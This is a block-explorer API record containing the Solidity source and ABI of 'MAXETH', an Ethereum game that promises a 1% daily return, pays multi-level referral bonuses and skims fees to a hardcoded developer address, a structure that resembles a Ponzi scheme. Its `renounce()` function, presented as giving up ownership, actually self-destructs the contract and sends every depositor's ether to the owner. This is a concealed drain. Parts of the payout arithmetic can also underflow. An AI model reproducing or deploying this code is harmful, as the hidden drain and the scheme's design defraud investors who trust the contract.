{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.5.0;\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\ncontract Context {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    function _msgSender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view returns (bytes memory) {\r\n        this;\r\n        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable is Context {\r\n    address private _owner; address payable sender;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () internal {\r\n        sender = msg.sender;\r\n        _owner = _msgSender();\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(isOwner(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the caller is the current owner.\r\n     */\r\n    function isOwner() public view returns (bool) {\r\n        return _msgSender() == _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounce() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n        selfdestruct(msg.sender);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transfer(address newOwner) public onlyOwner {\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     */\r\n    function _transferOwnership(address newOwner) internal {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n    \r\n}\r\n\r\n/**\r\n * @title Roles\r\n * @dev Library for managing addresses assigned to a Role.\r\n */\r\nlibrary Roles {\r\n    struct Role {\r\n        mapping(address => bool) bearer;\r\n    }\r\n\r\n    /**\r\n     * @dev Give an account access to this role.\r\n     */\r\n    function add(Role storage role, address account) internal {\r\n        require(!has(role, account), \"Roles: account already has role\");\r\n        role.bearer[account] = true;\r\n    }\r\n\r\n    /**\r\n     * @dev Remove an account's access to this role.\r\n     */\r\n    function remove(Role storage role, address account) internal {\r\n        require(has(role, account), \"Roles: account does not have role\");\r\n        role.bearer[account] = false;\r\n    }\r\n\r\n    /**\r\n     * @dev Check if an account has this role.\r\n     * @return bool\r\n     */\r\n    function has(Role storage role, address account) internal view returns (bool) {\r\n        require(account != address(0), \"Roles: account is the zero address\");\r\n        return role.bearer[account];\r\n    }\r\n}\r\n\r\n/**\r\n * @title WhitelistAdminRole\r\n * @dev WhitelistAdmins are responsible for assigning and removing Whitelisted accounts.\r\n */\r\ncontract WhitelistAdminRole is Context, Ownable {\r\n    using Roles for Roles.Role;\r\n\r\n    event WhitelistAdminAdded(address indexed account);\r\n    event WhitelistAdminRemoved(address indexed account);\r\n\r\n    Roles.Role private _whitelistAdmins;\r\n\r\n    constructor () internal {\r\n        _addWhitelistAdmin(_msgSender());\r\n    }\r\n\r\n    modifier onlyWhitelistAdmin() {\r\n        require(isWhitelistAdmin(_msgSender()) || isOwner(), \"WhitelistAdminRole: caller does not have the WhitelistAdmin role\");\r\n        _;\r\n    }\r\n\r\n    function isWhitelistAdmin(address account) public view returns (bool) {\r\n        return _whitelistAdmins.has(account);\r\n    }\r\n\r\n    function addWhitelistAdmin(address account) public onlyWhitelistAdmin {\r\n        _addWhitelistAdmin(account);\r\n    }\r\n\r\n    function removeWhitelistAdmin(address account) public onlyOwner {\r\n        _whitelistAdmins.remove(account);\r\n        emit WhitelistAdminRemoved(account);\r\n    }\r\n\r\n    function renounceWhitelistAdmin() public {\r\n        _removeWhitelistAdmin(_msgSender());\r\n    }\r\n\r\n    function _addWhitelistAdmin(address account) internal {\r\n        _whitelistAdmins.add(account);\r\n        emit WhitelistAdminAdded(account);\r\n    }\r\n\r\n    function _removeWhitelistAdmin(address account) internal {\r\n        _whitelistAdmins.remove(account);\r\n        emit WhitelistAdminRemoved(account);\r\n    }\r\n}\r\n\r\ncontract UtilMAXETH{\r\n    string constant public name = \"MAXETH\";\r\n    uint public poltime = 86400;\r\n    uint maxIncome = 3;\r\n    uint public rID = 0;\r\n    uint ethWei = 1 ether;\r\n}\r\n\r\ncontract MAXETH is UtilMAXETH, Ownable{\r\n    \r\n    address payable private devPool = address(0x61f482aB36243B2bCe55DF6DdA47D419b50801a0);\r\n    Player[] playerList;\r\n    \r\n    struct Player {\r\n        address userAddress;\r\n        address referralAddress;\r\n        uint level;\r\n        uint joinDate;\r\n        uint reinvestDate;\r\n        uint totalInvest;\r\n        uint investTimes;\r\n        uint specialBonus;\r\n        uint levelBonus;\r\n        uint pendingWithdrawal;\r\n        uint withdrawalAmount;\r\n        uint roiDoneBefore;\r\n        uint roiDone;\r\n        uint specialBonusDone;\r\n        uint levelBonusDone;\r\n        uint winDone;\r\n        uint incomeLimit;\r\n        uint totalReferral;\r\n        uint dailyRoi;\r\n        uint dailyPoint;\r\n        uint win;\r\n    }\r\n    \r\n    struct Round {\r\n        uint start;\r\n        uint end;\r\n        uint pot;\r\n        bool ended;\r\n        uint maxDailyPoint;\r\n        address maxRefAddr;\r\n    }\r\n    \r\n    mapping(address => Player) playerMapping;\r\n    mapping(uint => Round) public round;\r\n    \r\n    function sendtoDev(uint amount) private {\r\n        devPool.transfer(amount * 5 /100);\r\n    }\r\n    \r\n    function sendMoneyToUser(address payable userAddress, uint money) private {\r\n        userAddress.transfer(money);\r\n    }\r\n    \r\n    function openRound(uint i) external onlyOwner {\r\n        uint _rID = rID;\r\n        uint _now;\r\n        if(i != 0)\r\n        {\r\n            _now = i;\r\n        }\r\n        else\r\n        {\r\n            _now = now;\r\n        }\r\n \r\n        if(_now > round[_rID].end && round[_rID].ended == false)\r\n        {\r\n            round[_rID].ended = true;\r\n            endRound(_now, round[_rID].end);\r\n        }\r\n    }\r\n    \r\n    function endRound(uint _now, uint lastend) private {\r\n        uint _rID = rID;\r\n        uint last = lastend;\r\n        address _maxRefAddr = round[_rID].maxRefAddr;\r\n        uint256 _win;\r\n        uint256 _pot = round[_rID].pot;\r\n        uint i;\r\n        if(_pot > 0)\r\n        {\r\n            if(_maxRefAddr != address(0))\r\n            {\r\n                _win = _pot * 10 /100;\r\n                if(_win > 0){\r\n                    Player storage player = playerMapping[_maxRefAddr];\r\n                    player.win = player.win + _win;\r\n                }\r\n                \r\n                for(i = 0; i < playerList.length; i++){\r\n                    address addr = playerList[i].userAddress;\r\n                    Player storage playerUpdate = playerMapping[addr];\r\n                    playerUpdate.dailyPoint = 0;\r\n                }\r\n            }\r\n        }\r\n        \r\n        rID++;\r\n        _rID++;\r\n        if(last == 0)\r\n        {\r\n            round[_rID].start = _now;\r\n            round[_rID].end = _now + poltime;\r\n            round[_rID].pot = _pot - _win;\r\n        }\r\n        else\r\n        {\r\n            round[_rID].start = last;\r\n            round[_rID].end = last + poltime;\r\n            round[_rID].pot = _pot - _win;\r\n        }\r\n    }\r\n    \r\n    function updateReferral(address _referrer, uint amount) private\r\n    {\r\n        Player storage player = playerMapping[_referrer];\r\n        player.totalReferral = player.totalReferral +1 ;\r\n        player.level = player.level + 1;\r\n        \r\n        uint i = amount / ethWei;\r\n\r\n        player.dailyPoint = player.dailyPoint + i;\r\n        \r\n        if(player.dailyPoint >= round[rID].maxDailyPoint)\r\n        {\r\n            round[rID].maxDailyPoint = player.dailyPoint;\r\n            round[rID].maxRefAddr = _referrer;\r\n        }\r\n    }\r\n    \r\n    function updateReferralReinvest(address _referrer, uint amount) private\r\n    {\r\n        Player storage player = playerMapping[_referrer];\r\n        \r\n        uint i = amount / ethWei;\r\n\r\n        player.dailyPoint = player.dailyPoint + i;\r\n        \r\n        if(player.dailyPoint >= round[rID].maxDailyPoint)\r\n        {\r\n            round[rID].maxDailyPoint = player.dailyPoint;\r\n            round[rID].maxRefAddr = _referrer;\r\n        }\r\n    }\r\n    \r\n    function updateBonus(address _player, uint amount) private\r\n    {\r\n        uint i = 1;\r\n        Player memory _upline = playerMapping[_player];\r\n        address uplineAddr = _upline.referralAddress;\r\n        \r\n        while (i < 11) {\r\n            \r\n            Player storage player = playerMapping[uplineAddr];\r\n            \r\n            if(player.level >= i)\r\n            {\r\n                player.levelBonus =  player.levelBonus + amount * 10 / 100;\r\n            }\r\n            uplineAddr = player.referralAddress;\r\n            i++;\r\n        }\r\n    }\r\n    \r\n    function calROI(uint jd, uint roi, uint roiDone) private view returns (uint pendingROI)\r\n    {\r\n        uint _now = now;\r\n        \r\n        uint difference = _now - jd;\r\n        \r\n        pendingROI = (difference / poltime * roi) - roiDone;\r\n        \r\n        return pendingROI;\r\n    }\r\n    \r\n    function settle() external {\r\n        Player storage player = playerMapping[msg.sender];\r\n        \r\n        uint roiDone = player.roiDone;\r\n        \r\n        uint pendingROI = 0;\r\n        \r\n        if(player.reinvestDate == 0)\r\n            pendingROI = calROI(player.joinDate, player.dailyRoi, roiDone);\r\n        else\r\n            pendingROI = calROI(player.reinvestDate, player.dailyRoi, roiDone);\r\n        \r\n        uint pendingSettle = pendingROI + player.specialBonus + player.levelBonus + player.win;\r\n        \r\n        uint remaining = player.incomeLimit - player.withdrawalAmount - player.pendingWithdrawal + player.winDone + player.win;\r\n        \r\n        if(pendingSettle > remaining)\r\n        {\r\n            pendingSettle = remaining;\r\n        }\r\n        \r\n        if( pendingSettle != 0)\r\n        {\r\n            updateBonus(msg.sender,pendingROI);\r\n            \r\n            player.pendingWithdrawal = player.pendingWithdrawal + pendingSettle;\r\n            player.specialBonusDone =  player.specialBonusDone +  player.specialBonus;\r\n            player.levelBonusDone = player.levelBonusDone + player.levelBonus;\r\n            player.winDone = player.winDone + player.win;\r\n            player.roiDone = player.roiDone + pendingROI;\r\n            player.specialBonus = 0;\r\n            player.levelBonus = 0;\r\n            player.win = 0;\r\n        }\r\n    }\r\n    \r\n    function withdraw() external {\r\n        Player storage player = playerMapping[msg.sender];\r\n        \r\n        uint withdrawal = player.pendingWithdrawal;\r\n        \r\n        uint remaining = player.incomeLimit - player.pendingWithdrawal - player.withdrawalAmount;\r\n        \r\n        if( withdrawal > 0 && withdrawal < remaining)\r\n        {\r\n            uint withdrawal_after = withdrawal * 90 /100;\r\n            sendMoneyToUser(msg.sender,withdrawal_after);\r\n            player.pendingWithdrawal = 0;\r\n            player.withdrawalAmount = player.withdrawalAmount + withdrawal;\r\n            \r\n            round[rID].pot = round[rID].pot + (withdrawal * 5 / 100);\r\n            sendtoDev(withdrawal);\r\n            \r\n        }\r\n    }\r\n    \r\n    function play ( address _referrer ) external payable\r\n    {\r\n        Player storage player = playerMapping[msg.sender];\r\n        address ref = _referrer;\r\n        \r\n        if(_referrer == address(0x0000000000000000000000000000000000000000)){\r\n            ref = address(0x0583423cCCD97cEAf35db13f4959AF52E27C2fB5);\r\n        }\r\n        \r\n        if(player.userAddress == msg.sender)\r\n        {\r\n            require((msg.value + player.totalInvest) <= 10 * ethWei, \"exceed invest amount\");\r\n            require(msg.value >= 1 * ethWei, \"minimum 1 eth\");\r\n            player.reinvestDate = now;\r\n            player.investTimes = player.investTimes + 1;\r\n            player.totalInvest = player.totalInvest + msg.value;\r\n            player.incomeLimit = player.totalInvest * maxIncome;\r\n            player.dailyRoi = player.totalInvest * 1 / 100;\r\n            player.roiDoneBefore = player.roiDoneBefore + player.roiDone;\r\n            player.roiDone = 0;\r\n\r\n            updateReferralReinvest(player.referralAddress, msg.value);\r\n        }\r\n        else\r\n        {\r\n            require(msg.value <= 10 * ethWei, \"exceed invest amount\");\r\n            require(msg.sender != _referrer, \"referral cannot be ownself\");\r\n            require(msg.value >= 1 * ethWei, \"minimum 1 eth\");\r\n            player.level = 0;\r\n            player.userAddress = msg.sender;\r\n            player.referralAddress = ref;\r\n            player.joinDate = now;\r\n            player.reinvestDate = 0;\r\n            player.totalInvest = msg.value;\r\n            player.investTimes = 1;\r\n            player.dailyRoi = msg.value * 1 / 100;\r\n            player.incomeLimit = msg.value * maxIncome;\r\n            player.totalReferral = 0;\r\n            player.pendingWithdrawal = 0;\r\n            player.withdrawalAmount = 0;\r\n            player.win = 0;\r\n            player.dailyPoint = 0;\r\n            player.specialBonus = 0;\r\n            player.levelBonus = 0;\r\n            player.roiDone = 0; \r\n            player.specialBonusDone = 0; \r\n            player.levelBonusDone = 0; \r\n            player.winDone = 0;\r\n            \r\n            updateReferral(player.referralAddress, msg.value);\r\n            playerList.push(player);\r\n        }\r\n        \r\n        round[rID].pot = round[rID].pot + (msg.value * 5 / 100);\r\n        \r\n        sendtoDev(msg.value);\r\n    }\r\n    \r\n    function getPlayer(address player) public view returns (\r\n        address rAddr, uint jd, uint rd, uint ti, uint invTimes, uint Withdr, uint incomeLimit, uint tRef,uint level, uint dailyPoint\r\n    ) {\r\n        \r\n        Player memory playerInfo = playerMapping[player];\r\n        \r\n        rAddr = playerInfo.referralAddress;\r\n        jd = playerInfo.joinDate;\r\n        rd = playerInfo.reinvestDate;\r\n        ti = playerInfo.totalInvest;\r\n        invTimes = playerInfo.investTimes;\r\n        incomeLimit = playerInfo.incomeLimit;\r\n        tRef = playerInfo.totalReferral;\r\n        level = playerInfo.level;\r\n        dailyPoint = playerInfo.dailyPoint;\r\n        Withdr = playerInfo.withdrawalAmount;\r\n        \r\n        return (\r\n        rAddr,\r\n        jd,\r\n        rd,\r\n        ti,\r\n        invTimes,\r\n        Withdr,\r\n        incomeLimit,\r\n        tRef,\r\n        level,\r\n        dailyPoint\r\n        );\r\n    }\r\n    \r\n    function getPlayerInfo(address player) public view returns (\r\n        uint pWithdr, uint roi, uint dailyRoi, uint win, uint sB, uint lB, uint roiD, uint sBD, uint lBD, uint wD \r\n    ) {\r\n        Player memory playerInfo = playerMapping[player];\r\n        uint jd = playerInfo.joinDate;\r\n        uint rd = playerInfo.reinvestDate;\r\n        pWithdr = playerInfo.pendingWithdrawal;\r\n        dailyRoi = playerInfo.dailyRoi;\r\n        win = playerInfo.win;\r\n        sB = playerInfo.specialBonus;\r\n        lB = playerInfo.levelBonus;\r\n        roiD = playerInfo.roiDone + playerInfo.roiDoneBefore;\r\n        sBD = playerInfo.specialBonusDone;\r\n        lBD = playerInfo.levelBonusDone;\r\n        wD = playerInfo.winDone;\r\n        \r\n        if(rd == 0)\r\n            roi = calROI(jd, dailyRoi, playerInfo.roiDone);\r\n        else\r\n            roi = calROI(rd, dailyRoi, playerInfo.roiDone);\r\n        \r\n        if(roi + roiD >= playerInfo.incomeLimit)\r\n        {\r\n            roi = playerInfo.incomeLimit - playerInfo.roiDone - playerInfo.roiDoneBefore;\r\n        }\r\n        \r\n        return (\r\n        pWithdr,\r\n        roi,\r\n        dailyRoi,\r\n        win,\r\n        sB,\r\n        lB,\r\n        roiD,\r\n        sBD,\r\n        lBD,\r\n        wD\r\n        );\r\n    }\r\n    \r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"settle\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transfer\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"round\",\"outputs\":[{\"name\":\"start\",\"type\":\"uint256\"},{\"name\":\"end\",\"type\":\"uint256\"},{\"name\":\"pot\",\"type\":\"uint256\"},{\"name\":\"ended\",\"type\":\"bool\"},{\"name\":\"maxDailyPoint\",\"type\":\"uint256\"},{\"name\":\"maxRefAddr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"player\",\"type\":\"address\"}],\"name\":\"getPlayerInfo\",\"outputs\":[{\"name\":\"pWithdr\",\"type\":\"uint256\"},{\"name\":\"roi\",\"type\":\"uint256\"},{\"name\":\"dailyRoi\",\"type\":\"uint256\"},{\"name\":\"win\",\"type\":\"uint256\"},{\"name\":\"sB\",\"type\":\"uint256\"},{\"name\":\"lB\",\"type\":\"uint256\"},{\"name\":\"roiD\",\"type\":\"uint256\"},{\"name\":\"sBD\",\"type\":\"uint256\"},{\"name\":\"lBD\",\"type\":\"uint256\"},{\"name\":\"wD\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"player\",\"type\":\"address\"}],\"name\":\"getPlayer\",\"outputs\":[{\"name\":\"rAddr\",\"type\":\"address\"},{\"name\":\"jd\",\"type\":\"uint256\"},{\"name\":\"rd\",\"type\":\"uint256\"},{\"name\":\"ti\",\"type\":\"uint256\"},{\"name\":\"invTimes\",\"type\":\"uint256\"},{\"name\":\"Withdr\",\"type\":\"uint256\"},{\"name\":\"incomeLimit\",\"type\":\"uint256\"},{\"name\":\"tRef\",\"type\":\"uint256\"},{\"name\":\"level\",\"type\":\"uint256\"},{\"name\":\"dailyPoint\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"poltime\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"isOwner\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"rID\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounce\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"i\",\"type\":\"uint256\"}],\"name\":\"openRound\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_referrer\",\"type\":\"address\"}],\"name\":\"play\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"}]","ContractName":"MAXETH","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://7d89c0c8815b2e36fb5ee93e3be49eb2239648f801f979c63f03461318adc2cd"}]}